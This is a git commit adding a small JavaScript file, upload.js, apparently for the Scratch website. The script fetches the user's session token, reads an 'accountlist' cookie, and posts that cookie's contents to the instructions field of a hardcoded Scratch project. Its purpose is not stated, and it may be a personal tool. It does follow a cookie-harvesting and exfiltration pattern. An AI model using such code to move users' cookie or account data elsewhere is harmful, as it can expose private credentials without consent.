f3cc9dc4ef2424c8fa5798310ba806ed59cdc9a4
tonkachiharu <119844795+tonkachiharu@users.noreply.github.com>
2022-12-05 17:25:27 +0900

    Create upload.js

---
+++ upload.js
@@ -0,0 +1,21 @@
+async function upload(){
+	function getCookieValue(key) {
+		const cookies = document.cookie.split(';');
+		for (let cookie of cookies) {
+			var cookiesArray = cookie.split('='); 
+			if (cookiesArray[0].trim() == key.trim()) { 
+				return cookiesArray[1];  // (key[0],value[1])
+			}
+		}
+		return '';
+	}
+	
+	let token=(await(await fetch("/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
+	let data=await fetch("https://api.scratch.mit.edu/projects/771297522",{
+		method:"POST",
+		body:JSON.stringify({"instructions":getCookieValue("accountlist")}),
+		headers:{
+			"x-token":token
+		}});
+  }
+upload()
